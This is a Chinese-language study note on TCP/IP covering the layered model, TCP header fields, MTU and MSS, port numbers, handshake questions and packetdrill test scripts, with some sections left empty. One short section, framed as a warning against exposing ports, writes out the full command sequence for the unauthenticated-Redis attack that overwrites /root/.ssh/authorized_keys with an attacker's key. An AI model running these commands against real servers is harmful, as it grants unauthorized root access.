# TCP协议

## 分层模型框架

- 互联网框架
- 为什么需要分5层
- 分层模型的好处

## 分层模型

TCP/IP网络从上往下可以分为：

- 应用层：规定应用程序之间如何互相传递报文，常用的应用层协议有HTTP、DNS协议。
- 传输层：传输层为两台主机之间的应用进程提供端到端的逻辑通信。传输层通过端口号标识不同进程，主机收到数据包后，根据目标端口交由相应进程进行处理。通过五元组`(源IP地址，源端口，传输层协议，目的IP地址，目的端口)`能区分不同的会话。常见的传输层协议有TCP、UDP协议。
- 网络层：网络层负责提供主机到主机的通信，将传输层生成的数据报封装成分组数据包后，发往目标主机，并且提供路由选择功能。网络层最主要的协议是IP协议。
- 数据链路层：链路层负责将网络层生成的`IP`数据包封装为帧，并实现帧和电信号的编码与解码。数据链路层提供`MAC`地址用于网卡识别，子网络中的采用广播的形式
- 物理层：物理层负责采用物理手段连接节点和传递电信号。

## 分层的好处

分层的本质是通过分离关注点让复杂问题简单化，每一层只关注自己处理的事务，层与层之间采用标准化接口连接，因此只要接口不变化，层内部修改不会影响到其它层的操作。

## TCP概述

TCP协议具备以下特点：

- 可靠：TCP协议的底层协议是IP协议，IP协议只负责将数据报发送出去，不保证数据报到达对端的次序，也不保证数据报是否会到达对端。TCP协议采用如下手段保证可靠性：
  - 校验和：确保每个报文段的数据未被修改。
  - 序列号：解决报文段接收时出现乱序问题。
  - 超时重传：确保报文段一定会到达对端。
  - 流量控制、拥塞控制：根据网络状况，实时调整发包速度，降低丢包率。
- 面向连接：面向连接要求TCP协议发送数据之前必须先建立逻辑连接，结束通信时必须断开连接。TCP协议采用三次握手建立连接、四次挥手流程断开连接。
- 基于字节流
- 全双工：通信的双方任意时刻都能收发数据。

### TCP三次握手

### TCP四次挥手

## Packetdrill

### 基本使用

- 安装

```bash
git clone https://github.com/google/packetdrill
cd packetdrill/gtests/net/packetdrill
# 安装依赖
yum install -y bison flex
# 可以注释掉netdev.c中set_device_offload_flags的内容
./configure
# 去掉Makefile中 -static
make
# 运行
./packetdrill
```

- 使用
  - 执行系统调用，对比返回值是否符合预期
  - 将数据包注入协议栈，模拟协议栈收到包
  - 比较内存协议栈发出的包是否符合预期
  - 执行Shell和Python命令

```bash
// 0秒时，执行socket系统调用 
// #include <sys/socket.h>
// int socket(int domain,int type,int protocol)
// domain表示套接字使用的协议族信息，AF_INET 为ipv4，AF_INET6为ipv6
// type表示socket类型，SOCK_STREAM为面向连接，SOCK_DGRAM为面向无连接
// protocol表示协议类型，IPPROTO_TCP为tcp协议
// ...表示忽略参数，packetdrill将采用默认配置
// socket成功时将返回文件描述符，错误将返回-1
//Linux程序中，每个程序打开时都会创建三个文件描述符 stdin(0)、stdout(1)、stderr(2)
// 因此新建的文件描述符将从3开始，
0 socket(...,SOCK_STREAM,IPPROTO_TCP) = 3
// 设置端口参数为端口重用
+0 setsockopt(3,SOL_SOCKET,SO_REUSEADDR,[1],4) = 0
// 绑定文件描述符和端口，默认8080
+0 bind(3,...,...) = 0
// 监听端口
+0 listen(3,1) = 0

//TCP 三次握手，注入语法类似tcpdump
// > 表示预期协议栈发出的包
// < 注入数据包到协议栈中
// 注入一个SYN，起始seq、结束、包长度均为0 发送端窗口大小为4000，MSS值选项为1000
+0 < S 0:0(0) win 4000 <mss 1000> 
// 预期协议栈立即返回SYN/ACK，因为没有数据，所有起始、结束、长度均为0，ack seq+1
+0 > S. 0:0(0) ack 1 <...>
// 0.1秒后，注入ACK包，没有携带数据，所以数据长度为0
+0.1 < . 1:1(0) ack 1 win 1000

// accept返回新的文件fd
+0 accept(3,...,...) = 4
// 调用write往socket中写入10字节数据
+0 write(4,...,10) = 10
// 
+0 > P. 1:11(10) ack 1
+0.1 < . 1:1(0) ack 11 win 1000
```

`packetdrill demo.pkt`，可以采用`tcpdump -i any port 8080 -nn`抓包。

```bash
[root@upgrade-71132 ~]# tcpdump -i any port 8080 -nn
15:24:11.517457 IP 192.0.2.1.43297 > 192.168.67.249.8080: Flags [S], seq 0, win 4000, options [mss 1000], length 0
15:24:11.517521 IP 192.168.67.249.8080 > 192.0.2.1.43297: Flags [S.], seq 1375051555, ack 1, win 29200, options [mss 1460], length 0
15:24:11.617683 IP 192.0.2.1.43297 > 192.168.67.249.8080: Flags [.], ack 1, win 1000, length 0
15:24:11.617756 IP 192.168.67.249.8080 > 192.0.2.1.43297: Flags [P.], seq 1:11, ack 1, win 29200, length 10
15:24:11.717812 IP 192.0.2.1.43297 > 192.168.67.249.8080: Flags [.], ack 11, win 1000, length 0
15:24:11.717903 IP 192.168.67.249.8080 > 192.0.2.1.43297: Flags [F.], seq 11, ack 1, win 29200, length 0
15:24:11.717946 IP 192.0.2.1.43297 > 192.168.67.249.8080: Flags [R.], seq 1, ack 11, win 1000, length 0
```

### 原理

`packetdrill`创建虚拟网卡`tun0`，虚拟网卡位于`/dev/net/tun`，每次注入数据都是写入该文件中，然后数据进过虚拟网卡进入内核协议栈；读取数据也是从虚拟网卡中读取。

https://www.ibm.com/developerworks/cn/linux/l-tuntap/index.html

### 添加环境变量

```
# 修改/etc/profile
export PATH=/path_to_packetdrill/:$PATH
source /etc/profile

# packetdrill运行需要sudo权限，sudo命令为了安全性考虑，会覆盖用户自己PATH变量
# sudo sudo -v |grep PATH 查看
# 可以修改/etc/sudoers中的secure_path
# 也可以通过`sudo env PATH="$PATH" cmd_x`执行命令，也可以做一个alias 
alias sudo ='sudo env PATH="$PATH"'
```

## TCP报文头部

![TCP报文头部]()

- 源端口`Src Port`
- 目标端口`Dst Port`
- 序列号`Sequence Number`：本报文段第一个字节的序列号，序列号+报文长度，可以确认传输的数据段。序列号是一个32位的无符号整数，循环使用。在SYN报文中，序列号用于交换初始序列号，在其他报文中序列号用于保证包的次序，序列号只在发送数据、SYN和FIN的情况下会发生变化。
- 确认序号`Acknowledgement Number`：确认序号用于告知对方下一个期望接收的序号，该序列号之前的字节已收到。
  - 不是收到数据包后就会立刻确认，可以延迟一会(避免频繁的ACK包)。
  - ACK包不需要被确认。
- 包类型`TCP Flags`：八个比特位代表八种类型的包，使用时将对应的`bit`设置为`1`即可，可以组合使用。
- 窗口大小`Window Size`：窗口大小默认最大值为`2^16`字节，可以通过窗口缩放选项，将窗口扩大为原来的`2^n`倍，`n`取值为`0-14`。该缩放值在握手时的`SYN`中会指定。
- 可选项，格式为`kind(1byte)length(1byte)value`
  - `MSS`：最大段大小选项，TCP允许从对方接收的最大报文段长度。
  - `SACK`：选择确认项
  - `Window Scale`：窗口缩放选项。

## 数据包大小

![帧结构]()

数据链路层传输的帧大小有限，不能将太大的包直接塞给链路层，该限制为`MTU`。帧的头部占14个字节，CRC字段占4个字节，有效负载部分最小值为`46`字节，最大`1500`字节。可以通过`netstat -i`查看。

IP数据报的最大大小为`65535`字节，当数据报的大于`MTU`时，必须将数据报文进行切割。

![IP数据报结构]()

IP头部有一个表示分配偏移量的字段，表示该分段在原始数据报文中位置。IP头部最小为20字节。当数据报被切割为多个分段时，如果出现分段丢失时，目标主机将无法将分段重组为一个完整的数据报。从而引发了`IP fragment attack`攻击，一直传`More fragments=1`的包，耗尽接收方内存(`More fragments=1`表示后续还有分段)。

包从发送端到接收端，中间会跨越多个网络，因此整个链路的MTU有最小的MTU决定。

```
0 socket(...,SOCK_STREAM,IPPROTO_TCP) = 3
+0 setsockopt(3,SOL_SOCKET,SO_REUSEADDR,[1],4) = 0
+0 bind(3,...,...) = 0
+0 listen(3,1) = 0

+0 < S 0:0(0) win 4000 <mss 1000> 
+0 > S. 0:0(0) ack 1 <...>
+0.1 < . 1:1(0) ack 1 win 1000
+0 accept(3,...,...) = 4

// 发送1460字节
+0.2 write(4,...,1460)=1460
+0.0 > P. 1:1461(1460) ack 1

// 发送ICMp错误报文，包太大
+0.01 < icmp unreachable frag_needed mtu 1200 [1:1461(1460)]
// TCP选择提升的MTU，进行分片 1200-40=1160  IP头部20字节，TCP头部最小20字节
+0.0 > . 1:1161(1160) ack 1
+0.0 > P. 1161:1461(300) ack 1

//确认
+0.1 < . 1:1(0) ack 1461 win 257
```

![流程]()

TCP为了避免被分片，会主动将数据切割后再交给网络层，最大为`MSS=MTU-IP头部-TCP头部`，确保一个MSS的数据能装入一个MTU`1448`(1500-IP头部20-tcp头部20-tcp扩展12)。握手流程中，通信双方都会在SYN报文中说明自己的MSS。

有时抓包时会发现自己发送的数据超过MTU限制，这是因为TSO(TCP Segment Offload)特性，由网卡代替CPU实现分段和合并，节省系统资源，但实际上，链路中单个包的大小不会超过`MTU`。`ethtool -k 网卡名`可以查看该特性是否打开。

## 端口号

传输层采用端口号区分同一个主机上不同的应用程序，当数据包达到目标主机后，主机会根据数据包中的目标端口，将包交由相应的程序处理。端口分为：

- 保留端口`0-1023`：固定的应用程序使用，有IANA分配和控制，如80,443，使用时需要root权限。
- 登记端口：不受IANA控制，但是IANA会记录他们的使用`1024~49151`，`65535*0.75-1`，如mysql常用的`3306`。
- 临时端口：供本地应用程序使用，Linux中由`net.ipv4.ip_local_port_range`指定。

### 端口查看

- 查看对方端口开启：
  - `telnet IP Port`
  - `nc -v IP port`
- 查看端口占用：
  - `sudo netstat -ltpn |grep :port`
  - `lsof -n -P -i:port`(一切接文件)
- 查看进程占用的端口号：
  - `sudo netstat -atpn |grep 进程号`
  - `lsof -n -P -p 进程号|grep TCP`
  - 通过`/proc/进程号/fd/socket:[编号]`，然后`cat /proc/net/tcp|grep 编号`。

### 网络端口攻击

不要将没有必要的端口对外开放。Redis攻击：

- 开放`6379`了端口，并安装了redis。

- 通过本地生成`ssh-keygen`，然后将密钥写入文件中。

  ```
  (echo -e "\n\n";cat ~/.ssh/id_rsa.pub;echo -e "\n\n";) > foo.txt
  # 删除数据
  redis-cli -h ip echo flushall
  # 将数据写入key中
  cat foo.txt |redis-cli -h ip -x set crackit
  redis-cli -h ip
  config set dir /root/.ssh
  config set dbfilename "authorized_keys"
  # 刷盘保存
  save
  ```

  不要用root权限启动机进程，避免覆盖root下的文件。

## TCP三次握手流程

- 为什么需要握手流程呢？

  三次握手有两大作用：

  - 交换彼此的初始序列号
  - 交换辅助信息，如MSS、Win、WS(窗口缩放因子)等。

- SYN报文不携带数据，为什么要消耗一个序列号呢？

  消耗序列号，意味着对端必须进行确认，如果没有确认则会重传，直到指定重试次数位置。

- 初始序列号是如何生成的？

  初始序列号的生成随时间而变化，一个典型的设计时，每`4`微秒，ISN+1，移除后归零，重新计算。

- 为什么ISN不能固定？

  - 安全方面，当得知连接的ISN后，很容易构造RST报文，强制关闭连接。
  - 端口复用时，前一个连接的包可能会影响下一个连接的数据，当两个连接的ISN不同时，不会出现串包。

- 如何构建`SYN_SENT`状态连接

```
+0 socket(...,SOCK_STREAM,IPPROTO_TCP) = 3
+0 connect(3,...,...)=-1
# 搭配netstat -antp |grep -i 8080
 tcpdump -i any port 8080 -nn
 # 重试次数 /proc/sys/net/ipv4/tcp_syn_retries
 1+2+4+8+16+32=65s
```

## TCP四层挥手流程



## 定时器

### 连接建立定时器

- 主动建立连接端发送`SYN`报文后，会开启连接建立定时器，如果没有收到`ACK`报文，则重传`SYN`报文，重传次数由`net.ipv4.tcp_syn_retries`控制，默认值为`6`，重传间隔时间为`2^(i-1)S`，`i`为第几次重传。连接建立超时后，将报`Connection timed out`异常。



